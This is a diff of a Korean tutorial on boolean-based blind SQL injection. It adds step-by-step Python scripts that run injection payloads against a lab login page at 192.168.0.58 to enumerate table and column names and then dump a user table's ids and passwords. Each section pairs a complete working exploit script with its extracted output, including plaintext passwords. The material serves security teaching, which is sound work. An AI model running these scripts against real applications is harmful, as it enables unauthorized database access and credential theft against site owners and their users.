@@ -1,4 +1,4 @@
-# Blind SQL Injection
+# Boolean based SQL Injection
 
 [Error based SQL Injection](#https://github.com/2jinu/CyberSecurity/tree/main/Web/SQL%20Injection%20-%20Error%20based)처럼 에러가 출력되지 않는 상황에서 참 혹은 거짓의 결과만을 판별할 수 있거나,
 
@@ -260,7 +260,7 @@ print(f'USER : {RESULT}')
 
 참과 거짓의 결과 정보를 이용하여 데이터베이스의 이름을 획득해보자.
 
-다음과 같이 DBMS 계정의 문자열 길이를 확인할 것이고, URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.
+다음과 같이 데이터베이스의 문자열 길이를 확인할 것이고, URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.
 
 ```py
 QUERY       = requests.utils.quote(f'test\' AND LENGTH(DATABASE())={i}#')
@@ -387,9 +387,241 @@ for i in range(RESULT_LENGTH):
 	performance_schema
 
 ## **테이블 이름 확인**
+
+참과 거짓의 결과 정보를 이용하여 테이블의 이름을 획득해보자.
+
+먼저 COUNT를 이용하여 테이블의 수를 확인하자.
+
+SELECT의 이중쿼리의 경우 출력결과가 1개로 나와야 하며 괄호를 이용하여 감싸준다.
+
+URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.
+
+```py
+QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\')={i}#')
+```
+
+테이블 수만큼 반복하여 다음으로 테이블 이름의 문자열 길이를 알아내자.
+
+```py
+QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1))={j}#')
+```
+
+다시 SUBSTR로 문자열을 하나씩 확인한다.
+
+```py
+QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1),{j+1},1))={ord(s)}#')
+```
+
+다음의 Full Code로 모든 테이블의 이름을 확인해보자.
+
+```py
+import requests
+import string
+
+TARGET          = 'http://192.168.0.58/index.php'
+RESULT_LENGTH   = 0
+
+for i in range(100):
+    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\')={i}#')
+    URL         = TARGET + f'?userid={QUERY}&password=123'
+    REQUEST     = requests.get(url=URL)
+    if REQUEST.text == 'Welcome test':
+        RESULT_LENGTH = i
+        break
+print(f'Number of tables : {RESULT_LENGTH}')
+
+for i in range(RESULT_LENGTH):
+    TABLE_NAME_LENGTH    = 0
+    TABLE_NAME           = ''
+    for j in range(100):
+        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1))={j}#')
+        URL         = TARGET + f'?userid={QUERY}&password=123'
+        REQUEST     = requests.get(url=URL)
+        if REQUEST.text == 'Welcome test': TABLE_NAME_LENGTH = j
+    for j in range(TABLE_NAME_LENGTH):
+        for s in string.printable.strip():
+            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=\'test\' LIMIT {i},1),{j+1},1))={ord(s)}#')
+            URL     = TARGET + f'?userid={QUERY}&password=123'
+            REQUEST = requests.get(url=URL)
+            if REQUEST.text == 'Welcome test': TABLE_NAME += s
+    print(f'{TABLE_NAME}')
+```
+
+결과는 다음과 같다.
+
+	user
+
 ## **컬럼 이름 확인**
+
+참과 거짓의 결과 정보를 이용하여 컬럼의 이름을 획득해보자.
+
+먼저 COUNT를 이용하여 컬럼의 수를 확인하자.
+
+SELECT의 이중쿼리의 경우 출력결과가 1개로 나와야 하며 괄호를 이용하여 감싸준다.
+
+URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.
+
+```py
+QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\')={i}#')
+```
+
+컬럼 수만큼 반복하여 다음으로 컬럼의 문자열 길이를 알아내자.
+
+```py
+QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1))={j}#')
+```
+
+다시 SUBSTR로 문자열을 하나씩 확인한다.
+
+```py
+QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1),{j+1},1))={ord(s)}#')
+```
+
+다음의 Full Code로 모든 컬럼의 이름을 확인해보자.
+
+```py
+import requests
+import string
+
+TARGET          = 'http://192.168.0.58/index.php'
+RESULT_LENGTH   = 0
+
+for i in range(100):
+    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\')={i}#')
+    URL         = TARGET + f'?userid={QUERY}&password=123'
+    REQUEST     = requests.get(url=URL)
+    if REQUEST.text == 'Welcome test':
+        RESULT_LENGTH = i
+        break
+print(f'Number of columns : {RESULT_LENGTH}')
+
+for i in range(RESULT_LENGTH):
+    COLUMN_NAME_LENGTH    = 0
+    COLUMN_NAME           = ''
+    for j in range(100):
+        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1))={j}#')
+        URL         = TARGET + f'?userid={QUERY}&password=123'
+        REQUEST     = requests.get(url=URL)
+        if REQUEST.text == 'Welcome test': COLUMN_NAME_LENGTH = j
+    for j in range(COLUMN_NAME_LENGTH):
+        for s in string.printable.strip():
+            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=\'test\' AND TABLE_NAME=\'user\' LIMIT {i},1),{j+1},1))={ord(s)}#')
+            URL     = TARGET + f'?userid={QUERY}&password=123'
+            REQUEST = requests.get(url=URL)
+            if REQUEST.text == 'Welcome test': COLUMN_NAME += s
+    print(f'{COLUMN_NAME}')
+```
+
+결과는 다음과 같다.
+
+	id
+    pw
+
 ## **데이터 확인**
 
+참과 거짓의 결과 정보를 이용하여 데이터를 획득해보자.
+
+먼저 COUNT를 이용하여 데이터의 수를 확인하자.
+
+SELECT의 이중쿼리의 경우 출력결과가 1개로 나와야 하며 괄호를 이용하여 감싸준다.
+
+URL 인코딩을 시키기 위해 requests.utils.quote를 사용한다.
+
+```py
+QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(id) FROM test.user)={i}#')
+```
+
+데이터 수만큼 반복하여 다음으로 데이터의 문자열 길이를 알아내자.
+
+```py
+QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT id FROM test.user LIMIT {i},1))={j}#')
+```
+
+다시 SUBSTR로 문자열을 하나씩 확인한다.
+
+```py
+QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT id FROM test.user LIMIT {i},1),{j+1},1))={ord(s)}#')
+```
+
+다음의 Full Code로 모든 id 컬럼의 데이터를 확인해보자.
+
+```py
+import requests
+import string
+
+TARGET          = 'http://192.168.0.58/index.php'
+RESULT_LENGTH   = 0
+
+for i in range(100):
+    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(id) FROM test.user)={i}#')
+    URL         = TARGET + f'?userid={QUERY}&password=123'
+    REQUEST     = requests.get(url=URL)
+    if REQUEST.text == 'Welcome test':
+        RESULT_LENGTH = i
+        break
+print(f'Number of data : {RESULT_LENGTH}')
+
+for i in range(RESULT_LENGTH):
+    DATA_LENGTH    = 0
+    DATA           = ''
+    for j in range(100):
+        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT id FROM test.user LIMIT {i},1))={j}#')
+        URL         = TARGET + f'?userid={QUERY}&password=123'
+        REQUEST     = requests.get(url=URL)
+        if REQUEST.text == 'Welcome test': DATA_LENGTH = j
+    for j in range(DATA_LENGTH):
+        for s in string.printable.strip():
+            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT id FROM test.user LIMIT {i},1),{j+1},1))={ord(s)}#')
+            URL     = TARGET + f'?userid={QUERY}&password=123'
+            REQUEST = requests.get(url=URL)
+            if REQUEST.text == 'Welcome test': DATA += s
+    print(f'{DATA}')
+```
+
+결과는 다음과 같다.
+
+	admin
+    test
+
+다음의 Full Code로 모든 pw 컬럼의 데이터를 확인해보자.
+
+```py
+import requests
+import string
+
+TARGET          = 'http://192.168.0.58/index.php'
+RESULT_LENGTH   = 0
+
+for i in range(100):
+    QUERY       = requests.utils.quote(f'test\' AND (SELECT COUNT(id) FROM test.user)={i}#')
+    URL         = TARGET + f'?userid={QUERY}&password=123'
+    REQUEST     = requests.get(url=URL)
+    if REQUEST.text == 'Welcome test':
+        RESULT_LENGTH = i
+        break
+print(f'Number of data : {RESULT_LENGTH}')
+
+for i in range(RESULT_LENGTH):
+    DATA_LENGTH    = 0
+    DATA           = ''
+    for j in range(100):
+        QUERY       = requests.utils.quote(f'test\' AND LENGTH((SELECT pw FROM test.user LIMIT {i},1))={j}#')
+        URL         = TARGET + f'?userid={QUERY}&password=123'
+        REQUEST     = requests.get(url=URL)
+        if REQUEST.text == 'Welcome test': DATA_LENGTH = j
+    for j in range(DATA_LENGTH):
+        for s in string.printable.strip():
+            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT pw FROM test.user LIMIT {i},1),{j+1},1))={ord(s)}#')
+            URL     = TARGET + f'?userid={QUERY}&password=123'
+            REQUEST = requests.get(url=URL)
+            if REQUEST.text == 'Welcome test': DATA += s
+    print(f'{DATA}')
+```
+
+결과는 다음과 같다.
+
+	helloworld
+    test
 
 https://velog.io/@yu-jin-song/DB-SQL-%EC%9D%B8%EC%A0%9D%EC%85%98SQL-Injection
 https://m.blog.naver.com/lstarrlodyl/221837243294
